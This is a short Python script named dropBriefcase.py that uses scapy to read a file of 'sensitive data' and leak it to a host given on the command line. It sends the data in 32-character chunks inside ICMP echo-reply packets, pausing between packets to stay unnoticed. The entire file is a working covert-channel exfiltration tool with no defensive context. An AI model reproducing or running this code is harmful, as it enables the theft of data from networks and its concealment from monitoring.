#Example: python3 dropBriefcase.py sensitiveData.txt 192.168.253.136 
import sys
from scapy.all import *
from time import sleep

#conf.verb mutes scapys verbosity
conf.verb = 0

#Passed from command line
host = sys.argv[2]

# Sensitive data file passed from command line
f = open(sys.argv[1])

#Read data
data = f.read()
f.close()

print("Data size is %d characters" % len(data))

# Split data up into 32-character chunks to send payload in our new ICMP packets.
# while loop to process all data
i = 0
while i < len(data):
    print(data[i:i+32])
    sleep(5)

    #Create new ICMP Packet with payload
    newICMPPacket = IP(dst=host)/ICMP(type="echo-reply")/data[i:i+32]

    #Send the data over
    send(newICMPPacket)

    #Increase i to get next 32 characters
    i = i+32
    print("Sending Data",i)

